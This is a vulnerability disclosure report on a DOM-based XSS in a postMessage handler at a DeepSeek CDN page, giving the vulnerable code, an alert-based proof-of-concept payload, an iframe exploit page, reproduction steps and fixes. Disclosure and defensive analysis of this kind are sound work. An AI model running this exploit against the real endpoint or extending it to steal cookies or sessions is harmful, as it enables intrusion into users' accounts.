### **DOM-Based XSS Vulnerability Disclosure: DeepSeek.com**

#### **Summary**
During routine analysis, a DOM-based Cross-Site Scripting (XSS) vulnerability was identified on DeepSeek's CDN endpoint: `https://cdn.deepseek.com/usercontent/usercontent.html`. The vulnerability stems from improper handling of `postMessage` events, allowing an attacker to inject malicious scripts into the document context without proper origin validation or input sanitization.

---

#### **Affected URL**
`https://cdn.deepseek.com/usercontent/usercontent.html`

---

#### **Vulnerability Details**
The `postMessage` implementation on the affected endpoint processes messages without verifying their origin or properly sanitizing input. The following code snippet illustrates the root cause of the issue:

```javascript
window.addEventListener("message", (e) => {
    const keys = Object.keys(e.data);
    if (keys.length !== 1) return;
    if (!e.data.__deepseekCodeBlock) return;

    document.open();
    document.write(e.data.__deepseekCodeBlock);
    document.close();

    const style = document.createElement("style");
    style.textContent = "body { margin: 0; }";
    document.head.appendChild(style);
});
```

The function directly writes any `__deepseekCodeBlock` payload into the document using `document.write`, bypassing essential security measures such as:
- **Origin Validation**: No check to ensure the `postMessage` event originates from a trusted source.
- **Input Sanitization**: No filtering or escaping of HTML/JavaScript content in the payload.

---

#### **Proof of Concept (PoC)**

##### **Payload:**
The following `postMessage` payload can exploit the vulnerability to execute arbitrary JavaScript:
```javascript
postMessage(
    { __deepseekCodeBlock: '<script>alert(origin)</script>' },
    "*"
);
```

##### **Exploit Code:**
For easier testing, an iframe-based PoC was created to demonstrate the issue:
```html
<iframe
    width="600px"
    height="600px"
    src="https://cdn.deepseek.com/usercontent/usercontent.html"
    onload="this.contentWindow.postMessage( ({ __deepseekCodeBlock: '<script>alert(origin)</script>'}) ,'*')"
>
</iframe>
```

##### **Impact:**
When this payload is executed:
1. The browser processes the malicious payload.
2. An alert box is displayed showing the `origin`, confirming the ability to inject and execute arbitrary JavaScript.

---

#### **Steps to Reproduce**
1. Open `https://cdn.deepseek.com/usercontent/usercontent.html` in your browser.
2. Open the browser console and execute:
   ```javascript
   window.postMessage(
       { __deepseekCodeBlock: '<script>alert(origin)</script>' },
       "*"
   );
   ```
3. Alternatively, save and load the provided iframe-based exploit code in a browser.

---

#### **Recommendations**
To mitigate this vulnerability, it is critical to:
1. **Validate Message Origin**: Ensure that the `postMessage` event's `origin` matches a trusted domain:
   ```javascript
   if (e.origin !== "https://trusted-origin.com") return;
   ```
2. **Sanitize User Input**: Use a library such as DOMPurify to sanitize the HTML content in `e.data.__deepseekCodeBlock` before inserting it into the DOM.
3. **Avoid `document.write`**: Replace `document.write` with safer DOM manipulation methods like `createElement` and `appendChild`.

---

#### **Timeline**
- **Date of Discovery**: January 31, 2025
- **Reported To DeepSeek**: [Pending]
- **Acknowledgment**: [Pending]
- **Patch Status**: [Pending]

---

#### **Impact Assessment**
This vulnerability allows attackers to execute arbitrary JavaScript in the context of `cdn.deepseek.com`. Potential impacts include:
- Theft of sensitive user data (e.g., cookies or session tokens).
- Defacement or injection of malicious content.
- Further exploitation of users accessing the compromised page.

---

#### **Contact Information**
If you have any questions or need additional details, please feel free to contact me at [your email address].  

